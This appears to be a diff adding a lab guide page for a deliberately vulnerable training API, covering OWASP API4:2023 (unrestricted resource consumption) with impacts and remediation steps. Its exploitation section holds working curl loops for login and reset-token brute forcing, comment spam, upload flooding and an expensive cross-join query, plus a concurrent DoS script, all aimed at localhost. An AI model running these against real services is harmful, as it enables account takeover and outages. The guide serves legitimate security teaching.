@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>API4:2023 - Unrestricted Resource Consumption | VulnAPI-101</title>
+    <link rel="stylesheet" href="/static/css/style.css">
+</head>
+<body>
+    <header>
+        <h1>VulnAPI-101 <span class="warning-badge">GUIDES</span></h1>
+        <p>OWASP API Top 10 Vulnerability Reference</p>
+    </header>
+
+    <nav>
+        <ul>
+            <li><a href="/static/index.html">API Testing</a></li>
+            <li><a href="/guides/">Vulnerability Guides</a></li>
+            <li><a href="/guides/by-vulnerability.html">By Vulnerability</a></li>
+            <li><a href="/guides/by-file.html">By File</a></li>
+        </ul>
+    </nav>
+
+    <main>
+        <div class="container">
+            <h2><span class="owasp-tag owasp-api4">API4:2023</span> Unrestricted Resource Consumption</h2>
+            <span class="badge badge-warning">MEDIUM SEVERITY</span>
+
+            <h3>Description</h3>
+            <p>APIs that don't properly limit resource consumption are vulnerable to denial of service attacks, resource exhaustion, and cost explosion. This includes lack of rate limiting, no pagination, unrestricted query complexity, and no limits on file uploads or data processing.</p>
+
+            <h3>Affected Files</h3>
+            <ul>
+                <li><code>app/routes/users.py</code> - No pagination, no rate limiting</li>
+                <li><code>app/routes/products.py</code> - No pagination on lists and exports</li>
+                <li><code>app/routes/orders.py</code> - No pagination, unlimited bulk operations</li>
+                <li><code>app/routes/auth.py</code> - No login rate limiting</li>
+                <li><code>app/routes/files.py</code> - Large file uploads allowed</li>
+                <li><code>app/config.py</code> - Rate limiting disabled</li>
+            </ul>
+        </div>
+
+        <div class="container">
+            <h2>Exploitation Guide</h2>
+
+            <h3>1. No Pagination - Data Dumping</h3>
+            <p>List endpoints return all records without pagination:</p>
+            <div class="code-container">
+                <pre><code># Get ALL users at once (could be millions in production)
+curl http://localhost:5000/api/users
+
+# Get ALL orders
+curl http://localhost:5000/api/orders
+
+# Get ALL products
+curl http://localhost:5000/api/products
+
+# Get ALL audit logs
+curl http://localhost:5000/api/admin/logs \
+  -H "Authorization: Bearer $TOKEN"
+
+# Export ALL data at once
+curl http://localhost:5000/api/products/export
+curl http://localhost:5000/api/admin/backup \
+  -H "Authorization: Bearer $TOKEN"</code></pre>
+            </div>
+
+            <h3>2. No Rate Limiting - Brute Force</h3>
+            <p>Endpoints have no rate limiting, allowing rapid requests:</p>
+            <div class="code-container">
+                <pre><code># Brute force login - no blocking after failed attempts
+for i in {1..1000}; do
+  curl -s -X POST http://localhost:5000/api/auth/login \
+    -H "Content-Type: application/json" \
+    -d '{"username": "admin", "password": "attempt'$i'"}' &
+done
+
+# Brute force password reset tokens
+for token in {100000..999999}; do
+  curl -s -X POST http://localhost:5000/api/auth/reset-password \
+    -H "Content-Type: application/json" \
+    -d '{"email": "admin@vulnapi.local", "reset_token": "'$token'", "new_password": "hacked"}'
+done
+
+# Spam comments
+for i in {1..1000}; do
+  curl -X POST http://localhost:5000/api/products/1/comments \
+    -H "Authorization: Bearer $TOKEN" \
+    -H "Content-Type: application/json" \
+    -d '{"content": "Spam comment '$i'", "rating": 1}'
+done</code></pre>
+            </div>
+
+            <h3>3. Unlimited Bulk Operations</h3>
+            <p>Bulk endpoints have no limits on operation count:</p>
+            <div class="code-container">
+                <pre><code># Bulk update unlimited products
+curl -X POST http://localhost:5000/api/products/bulk-price-update \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "updates": [
+      {"product_id": 1, "price": 0.01},
+      {"product_id": 2, "price": 0.01},
+      {"product_id": 3, "price": 0.01}
+      // ... could include thousands
+    ]
+  }'
+
+# Bulk update unlimited orders
+curl -X POST http://localhost:5000/api/orders/bulk-status \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "order_ids": [1, 2, 3, 4, 5],
+    "status": "cancelled"
+  }'</code></pre>
+            </div>
+
+            <h3>4. Large File Uploads</h3>
+            <p>File upload allows very large files (100MB):</p>
+            <div class="code-container">
+                <pre><code># Create large file (100MB)
+dd if=/dev/zero of=largefile.bin bs=1M count=100
+
+# Upload large file
+curl -X POST http://localhost:5000/api/files/upload \
+  -H "Authorization: Bearer $TOKEN" \
+  -F "file=@largefile.bin"
+
+# Multiple large uploads can exhaust disk space
+for i in {1..10}; do
+  curl -X POST http://localhost:5000/api/files/upload \
+    -H "Authorization: Bearer $TOKEN" \
+    -F "file=@largefile.bin"
+done</code></pre>
+            </div>
+
+            <h3>5. Expensive Operations Without Limits</h3>
+            <div class="code-container">
+                <pre><code># Complex search with no limits
+curl "http://localhost:5000/api/users/search?q=a&field=username"
+
+# Database queries without limits
+curl -X POST http://localhost:5000/api/admin/database/query \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"query": "SELECT * FROM users CROSS JOIN products CROSS JOIN orders"}'</code></pre>
+            </div>
+
+            <h3>6. API Abuse Script</h3>
+            <p>Demonstration script for DoS testing:</p>
+            <div class="code-container">
+                <pre><code>#!/bin/bash
+# WARNING: Only run against your own test environment!
+
+TARGET="http://localhost:5000"
+CONCURRENT=50
+
+# Function to make requests
+make_request() {
+  while true; do
+    curl -s "$TARGET/api/users" > /dev/null &
+    curl -s "$TARGET/api/orders" > /dev/null &
+    curl -s "$TARGET/api/products" > /dev/null &
+  done
+}
+
+# Launch concurrent attackers
+for i in $(seq 1 $CONCURRENT); do
+  make_request &
+done
+
+echo "Attack running... Press Ctrl+C to stop"
+wait</code></pre>
+            </div>
+        </div>
+
+        <div class="container">
+            <h2>Impact</h2>
+            <ul>
+                <li><strong>Denial of Service:</strong> Server resources exhausted by many requests</li>
+                <li><strong>Cost Explosion:</strong> In cloud environments, excessive resource use = high bills</li>
+                <li><strong>Data Harvesting:</strong> Easy to dump entire database via unpaginated endpoints</li>
+                <li><strong>Disk Exhaustion:</strong> Large file uploads can fill storage</li>
+                <li><strong>Account Lockout Attacks:</strong> Brute force can lock legitimate users</li>
+            </ul>
+        </div>
+
+        <div class="container">
+            <h2>Remediation</h2>
+            <ol>
+                <li>Implement rate limiting (e.g., 100 requests/minute per IP)</li>
+                <li>Add pagination to all list endpoints (max 100 items per page)</li>
+                <li>Limit file upload sizes (e.g., 5MB max)</li>
+                <li>Set timeouts for long-running operations</li>
+                <li>Limit bulk operation batch sizes</li>
+                <li>Implement request size limits</li>
+            </ol>
+        </div>
+    </main>
+
+    <footer>
+        <p>VulnAPI-101 - Educational Purposes Only | <a href="https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/">OWASP Reference</a></p>
+    </footer>
+</body>
+</html>
